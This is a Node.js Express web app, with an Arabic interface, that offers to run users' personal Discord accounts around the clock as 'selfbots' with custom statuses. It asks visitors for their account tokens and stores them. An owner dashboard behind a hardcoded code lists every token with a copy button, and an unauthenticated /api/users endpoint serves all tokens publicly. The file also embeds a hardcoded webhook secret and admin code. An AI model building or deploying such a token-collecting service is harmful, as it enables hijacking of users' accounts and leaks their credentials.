const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const { Client } = require("discord.js-selfbot-v13");

app.use(bodyParser.json());

let users = [];
let bannedUsers = [];
let loginHistory = [];
const clients = new Map();
const ADMIN_CODE = "s2eekawashere";
const WEBHOOK_URL = "https://discord.com/api/webhooks/1456340583546355933/XemYbkGpLVl0JI91BnGaCvBtehnBTHYtin_mcJqVWjd6EjQRk5E88FbTHg28_tTLbr9C";

app.use((req, res, next) => {
    const userToken = (req.body && req.body.token) || (req.query && req.query.token);
    if (userToken && bannedUsers.includes(userToken)) {
        return res.status(403).send(`
            <div style="height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; color: #ff0000; font-family: 'Cairo', sans-serif; text-align: center; flex-direction: column;">
                <div style="font-size: 150px; line-height: 1;">✕</div>
                <h1 style="font-size: 3rem; margin-top: 20px;">أنت محظور من استعمال الموقع</h1>
                <p style="color: #fff; font-size: 1.2rem; margin-top: 10px;">يرجى مراجعة الإدارة لفك الحظر.</p>
            </div>
        `);
    }
    next();
});

const pageTemplate = (title, content, extraStyles = '') => `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title} | الزاحف سيكا</title>
    <meta name="description" content="المنصة الاحترافية الأولى لتشغيل حسابك الشخصي 24 ساعة بأداء خارق وتصميم عصري - الزاحف سيكا">
    <meta property="og:title" content="${title} | الزاحف سيكا">
    <meta property="og:description" content="المنصة الاحترافية الأولى لتشغيل حسابك الشخصي 24 ساعة بأداء خارق وتصميم حصري.">
    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1335276434385666189/1455485619789889578/IMG_7987.jpg?ex=6954e61d&is=6953949d&hm=ab67cd11f607573b31d5b9ac0881ed82cb7e82a4ebb896f4cc4d6df9e9b5e6ff&">
    <meta property="og:type" content="website">
    <meta name="theme-color" content="#8b5cf6">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-light: #a78bfa;
            --secondary: #ec4899;
            --bg-black: #050505;
            --card-bg: rgba(20, 20, 25, 0.7);
            --border: rgba(255, 255, 255, 0.08);
            --text-main: #ffffff;
            --text-dim: #94a3b8;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body { font-family: 'Cairo', sans-serif; background: var(--bg-black); color: var(--text-main); overflow-x: hidden; line-height: 1.6; }
        .gradient-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(circle at 10% 20%, rgba(139, 92, 246, 0.15) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(236, 72, 153, 0.1) 0%, transparent 40%); z-index: -1; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        .btn { cursor: pointer; padding: 12px 24px; border-radius: 12px; font-weight: 700; border: 1px solid var(--border); transition: all 0.3s ease; display: inline-flex; align-items: center; justify-content: center; gap: 8px; font-family: inherit; text-decoration: none; }
        .btn-primary { background: var(--primary); color: white; border: none; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3); }
        .glass-card { background: var(--card-bg); backdrop-filter: blur(20px); border: 1px solid var(--border); border-radius: 24px; padding: 40px; }
        input, select, textarea { width: 100%; padding: 14px; background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 12px; color: white; font-family: inherit; margin-top: 8px; }
        input:focus { border-color: var(--primary); }
        ${extraStyles}
    </style>
</head>
<body>
    <div class="gradient-bg"></div>
    ${content}
</body>
</html>
`;

async function startSelfbot(userData) {
    const { token, ownerId, statusName, statusType, statusDetails, statusImg, twitchLink, timeShift = 0 } = userData;
    if (clients.has(token)) try { clients.get(token).destroy(); } catch(e) {}
    const client = new Client({ checkUpdate: false });
    
    function updateActivity() {
        if (!client.user) return;
        
        const activityOptions = {
            type: statusType.toUpperCase(),
            state: userData.statusState || undefined,
            assets: { 
                largeImage: statusImg || undefined,
                smallImage: statusImg || undefined 
            }
        };

        if (statusType === 'Streaming') {
            activityOptions.url = twitchLink || "https://twitch.tv/5w6h";
            // Removed details property entirely for Streaming
            delete activityOptions.buttons;
        } else {
            activityOptions.details = statusDetails || undefined;
            if (activityOptions.details === statusName) {
                delete activityOptions.details;
            }
            activityOptions.timestamps = { start: Date.now() - (timeShift * 1000) };
        }

        if (activityOptions.state && activityOptions.state === statusName) {
            delete activityOptions.state;
        }

        if (activityOptions.details === undefined) delete activityOptions.details;
        if (activityOptions.state === undefined) delete activityOptions.state;

        client.user.setActivity(statusName || 'Selfbot Play', activityOptions);
    }

    client.on("ready", () => {
        updateActivity();
        const interval = setInterval(updateActivity, 3600000);
        
        client.on('shardDisconnect', () => clearInterval(interval));

        const userIdx = users.findIndex(u => u.token === token);
        if (userIdx !== -1) {
            users[userIdx].username = client.user.tag;
            users[userIdx].avatar = client.user.displayAvatarURL();
            users[userIdx].email = client.user.email || "No Email";
        }
    });
    
    client.login(token).then(() => clients.set(token, client)).catch(() => {});
}

app.get('/', (req, res) => {
    const content = `
    <section style="min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;">
        <div class="container">
            <div style="display: flex; gap: 20px; justify-content: center; margin-bottom: 40px;">
                <img src="https://cdn.discordapp.com/attachments/1335276434385666189/1455485619789889578/IMG_7987.jpg?ex=6954e61d&is=6953949d&hm=ab67cd11f607573b31d5b9ac0881ed82cb7e82a4ebb896f4cc4d6df9e9b5e6ff&" style="width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--primary); object-fit: cover; box-shadow: 0 0 30px rgba(139, 92, 246, 0.4);">
            </div>
            <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; margin-bottom: 15px; background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">الزاحف سيكا</h1>
            <p style="color: var(--text-dim); font-size: 1.2rem; max-width: 700px; margin: 0 auto 40px;">المنصة الاحترافية الأولى لتشغيل حسابك الشخصي 24 ساعة بأداء خارق وتصميم حصري.</p>
<style>
.btn-custom {
  background: linear-gradient(to right, #ffffff, #a78bfa, #ec4899);
  color: #000;
  border: none;
  font-weight: bold;
  padding: 10px 22px;
  border-radius: 10px;
  text-decoration: none;
  transition: all 0.25s ease-in-out;
  box-shadow: 0 0 0 rgba(0,0,0,0);
}

.btn-custom:hover {
  transform: scale(1.08);
  filter: brightness(1.15);
  box-shadow: 0 6px 15px rgba(0, 0, 0, 0.25);
}
</style>


<div style="display: flex; gap: 15px; justify-content: center; margin-top:20px;">
  <a href="#setup" class="btn-custom">ابدأ الآن</a>
  <a href="/about" class="btn-custom">عن المطورين</a>
  <a href="/uptime" class="btn-custom">Uptime Top</a>
</div>

    <section id="setup" style="padding: 100px 0;">
        <div class="container">
            <div class="glass-card" style="max-width: 800px; margin: 0 auto; background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(139, 92, 246, 0.05) 50%, rgba(236, 72, 153, 0.05) 100%); border: 1px solid rgba(255, 255, 255, 0.1);">
                <h2 style="text-align: center; margin-bottom: 40px; background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">إعدادات السيلف بوت</h2>
                <div style="display: grid; grid-template-columns: 1fr; gap: 25px;">
                    <div><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Tokens</label><textarea id="tokens" rows="4" placeholder="Token 1\\nToken 2..."></textarea></div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <div><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Owner ID</label><input type="text" id="ownerId"></div>
                        <div><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Status Name</label><input type="text" id="statusName"></div>
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <div><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Activity Type</label><select id="statusType"><option value="Playing">Playing</option><option value="Streaming">Streaming</option><option value="Listening">Listening</option><option value="Watching">Watching</option></select></div>
                        <div id="statusDetailsContainer"><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Details</label><input type="text" id="statusDetails"></div>
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <div><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">State</label><input type="text" id="statusState"></div>
                        <div><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Image URL</label><input type="text" id="statusImg"></div>
                    </div>
                    <div id="twitchLinkContainer" style="display: none;"><label style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">Twitch Link</label><input type="text" id="twitchLink"></div>
                </div>
                <div style="margin-top: 40px; display: flex; gap: 15px;">
                    <button onclick="runBot()" class="btn" style="flex: 2; background: #22c55e; color: white; border: none;">تشغيل</button>
                    <button onclick="runBot()" class="btn" style="flex: 1; background: #6b7280; color: white; border: none;">إعادة تشغيل</button>
                    <button onclick="stopBot()" class="btn" style="flex: 1; background: #ff0000; color: white; border: none;">إيقاف</button>
                </div>
                <div id="status-log" style="margin-top: 30px; background: rgba(0,0,0,0.4); border-radius: 12px; padding: 20px; height: 200px; overflow-y: auto; background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(139, 92, 246, 0.05) 50%, rgba(236, 72, 153, 0.05) 100%); border: 1px solid rgba(255, 255, 255, 0.1); color: #fff; font-family: monospace;">
                    <div style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">[الزاحف سيكا] بانتظار تهيئة البيانات...</div>
                </div>
            </div>
        </div>
    </section>
    <script>
        document.getElementById('statusType').addEventListener('change', function() {
            const isStreaming = this.value === 'Streaming';
            document.getElementById('twitchLinkContainer').style.display = isStreaming ? 'block' : 'none';
            document.getElementById('statusDetailsContainer').style.display = isStreaming ? 'none' : 'block';
            
            const stateField = document.getElementById('statusState').parentElement;
            const imgField = document.getElementById('statusImg').parentElement;
            
            if (isStreaming) {
                stateField.style.gridColumn = '1 / -1';
                imgField.style.gridColumn = '1 / -1';
            } else {
                stateField.style.gridColumn = 'auto';
                imgField.style.gridColumn = 'auto';
            }
        });
        function addLog(msg, color = "#10b981") {
            const log = document.getElementById('status-log');
            const div = document.createElement('div');
            div.style.color = color;
            div.style.marginBottom = '5px';
            div.innerHTML = \`[\${new Date().toLocaleTimeString()}] \${msg}\`;
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
        }
        async function runBot() {
            const tokens = document.getElementById('tokens').value.split('\\n').filter(t => t.trim());
            const data = {
                ownerId: document.getElementById('ownerId').value,
                statusName: document.getElementById('statusName').value,
                statusType: document.getElementById('statusType').value,
                statusDetails: document.getElementById('statusDetails').value,
                statusState: document.getElementById('statusState').value,
                statusImg: document.getElementById('statusImg').value,
                twitchLink: document.getElementById('twitchLink').value,
                timeShift: 0
            };
            if(!tokens.length || !data.ownerId || !data.statusImg) return addLog("يرجى إدخال التوكنات وايدي التحكم ورابط الصورة!", "#ef4444");
            for(const token of tokens) {
                await fetch('/api/save-user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ token: token.trim(), ...data }) });
            }
            addLog("تم التشغيل بنجاح 24/7");
        }
        function stopBot() { addLog("تم الإيقاف بنجاح.", "#ef4444"); }
    </script>
    `;
    res.send(pageTemplate('الرئيسية', content));
});

app.get('/uptime', (req, res) => {
    const content = `
    <div class="container" style="padding: 100px 0;">
        <div class="glass-card" style="max-width: 800px; margin: 0 auto; background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(139, 92, 246, 0.05) 50%, rgba(236, 72, 153, 0.05) 100%); border: 1px solid rgba(255, 255, 255, 0.1);">
            <h1 style="text-align: center; margin-bottom: 40px; background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Uptime Top</h1>
            <div id="uptime-list"></div>
        </div>
    </div>
    <script>
        function formatTime(ms) {
            let s = Math.floor(ms / 1000);
            let m = Math.floor(s / 60);
            let h = Math.floor(m / 60);
            s %= 60; m %= 60;
            return \`\${h}h \${m}m \${s}s\`;
        }
        async function updateUptime() {
            const res = await fetch('/api/users');
            const users = await res.json();
            const list = document.getElementById('uptime-list');
            list.innerHTML = '';
            users.sort((a,b) => a.startTime - b.startTime).forEach((u, i) => {
                const div = document.createElement('div');
                div.className = 'glass-card';
                div.style.marginBottom = '20px';
                div.style.padding = '20px';
                div.style.display = 'flex';
                div.style.alignItems = 'center';
                div.style.gap = '20px';
                div.style.position = 'relative';
                
                const uptime = formatTime(new Date() - new Date(u.startTime));
                
                div.innerHTML = \`
                    <div style="position: absolute; top: -10px; right: 10px; background: var(--primary); padding: 2px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: 900;">#\${i+1}</div>
                    <img src="\${u.avatar || 'https://via.placeholder.com/50'}" style="width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary);">
                    <div style="flex: 1;">
                        <div style="font-weight: 700;">\${u.username || u.ownerId}</div>
                        <div style="color: var(--text-dim); font-size: 0.9rem;">\${uptime}</div>
                    </div>
                \`;
                list.appendChild(div);
            });
        }
        setInterval(updateUptime, 10000);
        updateUptime();
    </script>
    `;
    res.send(pageTemplate('Uptime Top', content));
});

app.get('/about', (req, res) => {
    const content = `
    <div class="container" style="padding: 100px 0;">
        <div class="glass-card">
            <h1 style="margin-bottom: 40px; text-align: center; background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">المطور</h1>
            <div style="display: flex; justify-content: center; margin-bottom: 60px;">
                <div style="text-align: center;">
                    <img src="https://cdn.discordapp.com/attachments/1335276434385666189/1455485619789889578/IMG_7987.jpg?ex=6954e61d&is=6953949d&hm=ab67cd11f607573b31d5b9ac0881ed82cb7e82a4ebb896f4cc4d6df9e9b5e6ff&" style="width: 200px; height: 200px; border-radius: 50%; margin-bottom: 20px; object-fit: cover; border: 4px solid var(--primary); box-shadow: 0 0 40px rgba(139, 92, 246, 0.4);">
                    <h3 style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem;">الزاحف سيكا</h3>
                    <p style="color: var(--text-dim); font-size: 1.2rem;">متخصص في تطوير أنظمة الديسكورد المتقدمة والحلول السحابية.</p>
                </div>
            </div>
            <div style="background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(139, 92, 246, 0.05) 50%, rgba(236, 72, 153, 0.05) 100%); padding: 40px; border-radius: 20px; border: 1px solid var(--border);">
                <h2 style="margin-bottom: 25px; background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center;">مميزات المنصة</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; text-align: center; font-weight: bold; font-size: 1.1rem;">
                    <div style="background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">✦ دعم التوكنات المتعددة</div>
                    <div style="background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">✦ تشغيل سحابي 24/7</div>
                    <div style="background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">✦ تحكم كامل في الحالة</div>
                    <div style="background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">✦ لوحة تحكم حصرية</div>
                    <div style="background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">✦ واجهة عربية احترافية</div>
                    <div style="background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">✦ حماية وتشفير عالي</div>
                </div>
            </div>
        </div>
    </div>
    `;
    res.send(pageTemplate('عن المطور', content));
});

app.get('/ownerpanel', (req, res) => {
    res.send(pageTemplate('دخول الأونر', `
        <div style="height: 100vh; display: flex; align-items: center; justify-content: center;">
            <div class="glass-card" style="width: 400px; text-align: center;">
                <h2 style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">دخول الأونر</h2>
                <input type="password" id="c1" placeholder="الكود السري" style="margin-bottom: 20px;">
                <button onclick="l()" class="btn btn-primary" style="width: 100%; background: linear-gradient(135deg, #a78bfa 0%, #ec4899 100%); border: none;">دخول</button>
            </div>
        </div>
        <script>
            function l() {
                const c1 = document.getElementById('c1').value;
                if(c1) {
                    fetch('/api/log-login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ code: c1 }) });
                    window.location.href = '/dashboard?code='+c1;
                }
            }
        </script>
    `));
});

app.get('/dashboard', (req, res) => {
    if(req.query.code !== ADMIN_CODE) return res.status(403).send('مرفوض');
    res.send(pageTemplate('الداشبورد', `
        <div class="container" style="padding: 40px 0;">
            <div class="glass-card" style="margin-bottom: 30px;">
                <h2 style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px;">سجل الدخول</h2>
                <div style="max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; font-size: 0.9rem;">
                    ${loginHistory.map(l => `<div style="margin-bottom: 5px; color: #a78bfa;">[${l.time}] محاولة دخول بالكود: ${l.code}</div>`).join('')}
                </div>
            </div>

            <div class="glass-card" style="margin-bottom: 30px;">
                <h2 style="background: linear-gradient(to right, #fff, #a78bfa, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">إدارة المستخدمين</h2>
                <div style="overflow-x: auto; margin-top: 20px;">
                    <table style="width: 100%; border-collapse: collapse; text-align: right;">
                        <thead><tr style="border-bottom: 1px solid var(--border); color: #a78bfa;"><th style="padding: 15px;">اليوزر</th><th style="padding: 15px;">التوكن</th><th style="padding: 15px;">التحكم</th></tr></thead>
                        <tbody>
                            ${users.map((u, i) => `
                                <tr style="border-bottom: 1px solid var(--border);">
                                    <td style="padding: 15px;">${u.username || u.ownerId}</td>
                                    <td style="padding: 15px;">
                                        <div style="display: flex; gap: 10px; align-items: center;">
                                            <input type="text" value="${u.token}" id="token-${i}" readonly style="width: 250px; background: #000; color: #fff; border: 1px solid #333; padding: 5px; font-size: 0.8rem;">
                                            <button onclick="copyToken('${u.token}')" class="btn" style="padding: 5px 10px; font-size: 0.7rem; background: #4b5563;">نسخ</button>
                                        </div>
                                    </td>
                                    <td style="padding: 15px;">
                                        <div style="display: flex; gap: 8px;">
                                            <button onclick="shiftTime(${i}, 3600)" class="btn" style="padding: 5px 10px; font-size: 0.7rem; background: #22c55e;">+1h</button>
                                            <button onclick="banUser('${u.token}')" class="btn" style="padding: 5px 10px; font-size: 0.7rem; background: #ef4444;">حظر</button>
                                        </div>
                                    </td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <script>
            function copyToken(token) {
                navigator.clipboard.writeText(token);
                alert('تم نسخ التوكن');
            }
            async function shiftTime(index, seconds) {
                await fetch('/api/shift-time', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ index, seconds, code: '${ADMIN_CODE}' })
                });
                location.reload();
            }
            async function banUser(token) {
                if(confirm('هل أنت متأكد من حظر هذا المستخدم؟')) {
                    await fetch('/api/ban-user', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ token, code: '${ADMIN_CODE}' })
                    });
                    location.reload();
                }
            }
        </script>
    `));
});

app.post('/api/save-user', async (req, res) => {
    const { token, ownerId, statusName, statusType, statusDetails, statusImg, twitchLink, timeShift } = req.body;
    const startTime = new Date().toISOString();
    const userData = { token, ownerId, statusName, statusType, statusDetails, statusImg, twitchLink, timeShift, startTime };
    
    const existingIdx = users.findIndex(u => u.token === token);
    if (existingIdx !== -1) {
        users[existingIdx] = { ...users[existingIdx], ...userData };
    } else {
        users.push(userData);
    }
    
    await startSelfbot(userData);
    res.json({ success: true });
});

app.get('/api/users', (req, res) => res.json(users));

app.post('/api/log-login', (req, res) => {
    loginHistory.unshift({ code: req.body.code, time: new Date().toLocaleString('ar-EG') });
    if(loginHistory.length > 50) loginHistory.pop();
    res.json({ success: true });
});

app.post('/api/shift-time', (req, res) => {
    if(req.body.code !== ADMIN_CODE) return res.status(403).send('مرفوض');
    const { index, seconds } = req.body;
    if(users[index]) {
        users[index].timeShift = (users[index].timeShift || 0) + seconds;
        startSelfbot(users[index]);
    }
    res.json({ success: true });
});

app.post('/api/ban-user', (req, res) => {
    if(req.body.code !== ADMIN_CODE) return res.status(403).send('مرفوض');
    const { token } = req.body;
    if(!bannedUsers.includes(token)) bannedUsers.push(token);
    const client = clients.get(token);
    if(client) {
        try { client.destroy(); } catch(e) {}
        clients.delete(token);
    }
    res.json({ success: true });
});

app.listen(22014 , '0.0.0.0', () => {
    console.log('Server is running on port 22014');
});